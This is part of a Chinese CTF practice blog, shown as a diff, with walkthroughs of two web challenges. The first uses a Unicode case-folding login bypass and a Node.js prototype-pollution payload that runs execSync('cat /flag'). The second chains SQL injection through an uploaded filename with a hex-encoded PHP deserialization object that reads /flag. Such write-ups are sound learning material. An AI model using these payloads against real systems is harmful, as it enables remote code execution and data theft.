+router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  res<span class="token punctuation">.</span>outputFunctionName<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
+  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'user'</span><span class="token operator">:</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>user<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+
+router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>Submit<span class="token operator">==</span><span class="token string">"register"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">safeKeyword</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>userid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('forbid word');history.go(-1);&lt;/script>"</span><span class="token punctuation">)</span> 
+   <span class="token punctuation">&#125;</span>
+    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token operator">=</span><span class="token punctuation">&#123;</span>
+      <span class="token string">'user'</span><span class="token operator">:</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>userid<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+      <span class="token string">'passwd'</span><span class="token operator">:</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>pwd<span class="token punctuation">,</span>
+      <span class="token string">'isLogin'</span><span class="token operator">:</span><span class="token boolean">false</span>
+    <span class="token punctuation">&#125;</span>
+    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>Submit<span class="token operator">==</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('register first');history.go(-1);&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>user<span class="token operator">==</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>userid<span class="token operator">&amp;&amp;</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>pwd<span class="token operator">==</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>passwd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+      req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>isLogin<span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+      res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('error passwd');history.go(-1);&lt;/script>"</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+  
+  <span class="token punctuation">&#125;</span>
+  res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/action'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>user<span class="token operator">!=</span><span class="token string">"ADMIN"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('ADMIN is asked');history.go(-1);&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span> 
+  req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>data <span class="token operator">=</span> <span class="token function">clone</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('success');history.go(-1);&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/info'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'user'</span><span class="token operator">:</span>res<span class="token punctuation">.</span>outputFunctionName<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre>
+
+<p>我们看到登录的部分有toUpperCase，而题目要求要用ADMIN用户登录，这里可以利用js的大小写特性绕过</p>
+<pre class="language-none"><code class="language-none">toUpperCase()
+
+其中混入了两个奇特的字符&quot;ı&quot;、&quot;ſ&quot;。
+
+ 这两个字符的“大写”是I和S。也就是说&quot;ı&quot;.toUpperCase() &#x3D;&#x3D; &#39;I&#39;，&quot;ſ&quot;.toUpperCase() &#x3D;&#x3D; &#39;S&#39;。通过这个小特性可以绕过一些限制。
+
+toLowerCase()
+
+这个&quot;K&quot;的“小写”字符是k，也就是&quot;K&quot;.toLowerCase() &#x3D;&#x3D; &#39;k&#39;.</code></pre>
+
+<p>利用admın注册就可以</p>
+<p>登录后提示flag在/flag里</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220418221749857.png" alt="image-20220418221749857"></p>
+<p>而源码中存在着merge函数</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220418221823929.png" alt="image-20220418221823929"></p>
+<p>而info中</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220418221932516.png" alt="image-20220418221932516"></p>
+<p>outputFunction正好又是未定义，info还会将outputFunctionName渲染到页面中</p>
+<p>所以我们可以给对象原型的类添加一个outputFunctionName属性，通过它得到flag。</p>
+<p>payload：</p>
+<pre class="language-none"><code class="language-none">&#123;&quot;lua&quot;:&quot;php&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat &#x2F;flag&#39;)&#x2F;&#x2F;&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;
+不太理解这里最后的&#x2F;&#x2F;的含义，但是没有这个不会成功执行，而且会出现报错，所以我认为可能是对后文的注释，而且用
+&#123;&quot;lua&quot;:&quot;php&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat &#x2F;flag&#39;);x&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;也能成功，所以应该就是为了保证语句的完整</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220418222438819.png" alt="image-20220418222438819"></p>
+<p>这时候再访问一下/info就能下载到flag文件</p>
+<h2 id="安洵杯-2019-不是文件上传"><a href="#安洵杯-2019-不是文件上传" class="headerlink" title="[安洵杯 2019]不是文件上传"></a>[安洵杯 2019]不是文件上传</h2><p>确实不是文件上传，只能传图片而且路径也没有，这其实是一个搭配反序列化的sql题</p>
+<p>show.php:</p>
+<pre class="language-none"><code class="language-none">&lt;?php
+include(&quot;.&#x2F;helper.php&quot;);
+$show &#x3D; new show();
+if($_GET[&quot;delete_all&quot;])&#123;
+   if($_GET[&quot;delete_all&quot;] &#x3D;&#x3D; &quot;true&quot;)&#123;
+      $show-&gt;Delete_All_Images();
+   &#125;
+&#125;
+$show-&gt;Get_All_Images();
+
+class show&#123;
+   public $con;
+
+   public function __construct()&#123;
+      $this-&gt;con &#x3D; mysqli_connect(&quot;127.0.0.1&quot;,&quot;r00t&quot;,&quot;r00t&quot;,&quot;pic_base&quot;);
+      if (mysqli_connect_errno($this-&gt;con))&#123; 
+             die(&quot;Connect MySQL Fail:&quot;.mysqli_connect_error());
+      &#125;
+   &#125;
+
+   public function Get_All_Images()&#123;
+      $sql &#x3D; &quot;SELECT * FROM images&quot;;
+      $result &#x3D; mysqli_query($this-&gt;con, $sql);
+      if ($result-&gt;num_rows &gt; 0)&#123;
+          while($row &#x3D; $result-&gt;fetch_assoc())&#123;
+             if($row[&quot;attr&quot;])&#123;
+                $attr_temp &#x3D; str_replace(&#39;\0\0\0&#39;, chr(0).&#39;*&#39;.chr(0), $row[&quot;attr&quot;]);
+               $attr &#x3D; unserialize($attr_temp);
+            &#125;
+              echo &quot;&lt;p&gt;id&#x3D;&quot;.$row[&quot;id&quot;].&quot; filename&#x3D;&quot;.$row[&quot;filename&quot;].&quot; path&#x3D;&quot;.$row[&quot;path&quot;].&quot;&lt;&#x2F;p&gt;&quot;;
+          &#125;
+      &#125;else&#123;
+          echo &quot;&lt;p&gt;You have not uploaded an image yet.&lt;&#x2F;p&gt;&quot;;
+      &#125;
+      mysqli_close($this-&gt;con);
+   &#125;
+
+   public function Delete_All_Images()&#123;
+      $sql &#x3D; &quot;DELETE FROM images&quot;;
+      $result &#x3D; mysqli_query($this-&gt;con, $sql);
+   &#125;
+&#125;</code></pre>
+
+<p>upload.php</p>
+<pre class="language-none"><code class="language-none">&lt;?php
+include(&quot;.&#x2F;helper.php&quot;);
+class upload extends helper &#123;
+   public function upload_base()&#123;
+      $this-&gt;upload();
+   &#125;
+&#125;
+
+if ($_FILES)&#123;
+   if ($_FILES[&quot;file&quot;][&quot;error&quot;])&#123;
+      die(&quot;Upload file failed.&quot;);
+   &#125;else&#123;
+      $file &#x3D; new upload();
+      $file-&gt;upload_base();
+   &#125;
+&#125;
+
+$a &#x3D; new helper();</code></pre>
+
+<p>helper.php</p>
+<pre class="language-none"><code class="language-none">&lt;?php
+class helper &#123;
+   protected $folder &#x3D; &quot;pic&#x2F;&quot;;
+   protected $ifview &#x3D; False; 
+   protected $config &#x3D; &quot;config.txt&quot;;
+   &#x2F;&#x2F; The function is not yet perfect, it is not open yet.
+
+   public function upload($input&#x3D;&quot;file&quot;)
+   &#123;
+      $fileinfo &#x3D; $this-&gt;getfile($input);
+      $array &#x3D; array();
+      $array[&quot;title&quot;] &#x3D; $fileinfo[&#39;title&#39;];
+      $array[&quot;filename&quot;] &#x3D; $fileinfo[&#39;filename&#39;];
+      $array[&quot;ext&quot;] &#x3D; $fileinfo[&#39;ext&#39;];
+      $array[&quot;path&quot;] &#x3D; $fileinfo[&#39;path&#39;];
+      $img_ext &#x3D; getimagesize($_FILES[$input][&quot;tmp_name&quot;]);
+      $my_ext &#x3D; array(&quot;width&quot;&#x3D;&gt;$img_ext[0],&quot;height&quot;&#x3D;&gt;$img_ext[1]);
+      $array[&quot;attr&quot;] &#x3D; serialize($my_ext);
+      $id &#x3D; $this-&gt;save($array);
+      if ($id &#x3D;&#x3D; 0)&#123;
+         die(&quot;Something wrong!&quot;);
+      &#125;
+      echo &quot;&lt;br&gt;&quot;;
+      echo &quot;&lt;p&gt;Your images is uploaded successfully. And your image&#39;s id is $id.&lt;&#x2F;p&gt;&quot;;
+   &#125;
+
+   public function getfile($input)
+   &#123;
+      if(isset($input))&#123;
+         $rs &#x3D; $this-&gt;check($_FILES[$input]);
+      &#125;
+      return $rs;
+   &#125;
+
+   public function check($info)
+   &#123;
+      $basename &#x3D; substr(md5(time().uniqid()),9,16);
+      $filename &#x3D; $info[&quot;name&quot;];
+      $ext &#x3D; substr(strrchr($filename, &#39;.&#39;), 1);
+      $cate_exts &#x3D; array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;jpeg&quot;);
+      if(!in_array($ext,$cate_exts))&#123;
+         die(&quot;&lt;p&gt;Please upload the correct image file!!!&lt;&#x2F;p&gt;&quot;);
+      &#125;
+       $title &#x3D; str_replace(&quot;.&quot;.$ext,&#39;&#39;,$filename);
+       return array(&#39;title&#39;&#x3D;&gt;$title,&#39;filename&#39;&#x3D;&gt;$basename.&quot;.&quot;.$ext,&#39;ext&#39;&#x3D;&gt;$ext,&#39;path&#39;&#x3D;&gt;$this-&gt;folder.$basename.&quot;.&quot;.$ext);
+   &#125;
+
+   public function save($data)
+   &#123;
+      if(!$data || !is_array($data))&#123;
+         die(&quot;Something wrong!&quot;);
+      &#125;
+      $id &#x3D; $this-&gt;insert_array($data);
+      return $id;
+   &#125;
+
+   public function insert_array($data)
+   &#123;  
+      $con &#x3D; mysqli_connect(&quot;127.0.0.1&quot;,&quot;r00t&quot;,&quot;r00t&quot;,&quot;pic_base&quot;);
+      if (mysqli_connect_errno($con)) 
+      &#123; 
+          die(&quot;Connect MySQL Fail:&quot;.mysqli_connect_error());
+      &#125;
+      $sql_fields &#x3D; array();
+      $sql_val &#x3D; array();
+      foreach($data as $key&#x3D;&gt;$value)&#123;
+         $key_temp &#x3D; str_replace(chr(0).&#39;*&#39;.chr(0), &#39;\0\0\0&#39;, $key);
+         $value_temp &#x3D; str_replace(chr(0).&#39;*&#39;.chr(0), &#39;\0\0\0&#39;, $value);
+         $sql_fields[] &#x3D; &quot;&#96;&quot;.$key_temp.&quot;&#96;&quot;;
+         $sql_val[] &#x3D; &quot;&#39;&quot;.$value_temp.&quot;&#39;&quot;;
+      &#125;
+      $sql &#x3D; &quot;INSERT INTO images (&quot;.(implode(&quot;,&quot;,$sql_fields)).&quot;) VALUES(&quot;.(implode(&quot;,&quot;,$sql_val)).&quot;)&quot;;
+      mysqli_query($con, $sql);
+      $id &#x3D; mysqli_insert_id($con);
+      mysqli_close($con);
+      return $id;
+   &#125;
+
+   public function view_files($path)&#123;
+      if ($this-&gt;ifview &#x3D;&#x3D; False)&#123;
+         return False;
+         &#x2F;&#x2F;The function is not yet perfect, it is not open yet.
+      &#125;
+      $content &#x3D; file_get_contents($path);
+      echo $content;
+   &#125;
+
+   function __destruct()&#123;
+      # Read some config html
+      $this-&gt;view_files($this-&gt;config);
+   &#125;
+&#125;</code></pre>
+
+<p>我们能看到helper里有个file_get_contents，而且path的值是config的内容</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220419173441837.png" alt="image-20220419173441837"></p>
+<p>在show里还有个unserialize</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220419173934449.png" alt="image-20220419173934449"></p>
+<p>可以看出这个题是反序列化，而我们的目的就是控制config里的内容</p>
+<p>反序列化的部分很简单</p>
+<pre class="language-none"><code class="language-none">&lt;?php
+
+class helper
+&#123;
+    protected $ifview &#x3D; true;
+    protected $config &#x3D; &quot;&#x2F;flag&quot;;
+&#125;
+
+$a &#x3D; new helper();
+echo serialize($a);</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220419174443448.png" alt="image-20220419174443448"></p>
+<p>但是我们要想办法把这个传进去</p>
+<p>再来看把图片存入数据库的过程</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220419182850792.png" alt="image-20220419182850792"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220419182904814.png" alt="image-20220419182904814"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220419183012084.png" alt="image-20220419183012084"></p>
+<p>那么正常的语句就应该是</p>
+<pre class="language-none"><code class="language-none">INSERT INTO images (&#96;title&#96;,&#96;filename&#96;,&#96;ext&#96;,&#96;path&#96;,&#96;attr&#96;) VALUES(&#39;图片名称&#39;,&#39;f20c76cc4fb41838.jpg&#39;,&#39;jpg&#39;,&#39;pic&#x2F;f20c76cc4fb41838.jpg&#39;,&#39;a:2:&#123;s:5:&quot;width&quot;;i:1264;s:6:&quot;height&quot;;i:992;&#125;&#39;)</code></pre>
+
+<p>而title我们是可控的，所以我们构造的payload为</p>
+<pre class="language-none"><code class="language-none">1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d)#.png</code></pre>
+
+<p>解释：看show里反序列化的部分，是只对attr部分进行了反序列化，所以我们在构造的时候，就要把我们的序列化语句放在attr的位置上，前边四个放1，并且用单引号来闭合前面的第一个单引号，#是为了注释后面的sql语句，保证顺利执行，.png是保证是个图片的后缀，让文件能传上去</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220419184421898.png"></p>
+<p>而<code>0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d</code>是<code>O:6:&quot;helper&quot;:2:&#123;s:9:&quot;\0\0\0ifview&quot;;b:1;s:9:&quot;\0\0\0config&quot;;s:5:&quot;/flag&quot;;&#125;</code>的十六进制形式，因为文件名不允许存在双引号，\0是因为我们的序列化的两个属性都是protected类型的，而在储存时对protected序列化后出现的不可见字符与*的组合进行了替换，将chr(0)*chr(0)替换为了\0\0\0，在反序列化时又换了回去，为了程序的执行，所以我们要将其替换</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220419184018967.png" alt="image-20220419184018967"></p>
 
                 
             </div>
@@ -1931,7 +2848,7 @@ $(function () {
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">84.7k</span>
+                        class="white-color">94.7k</span>
             
             
             
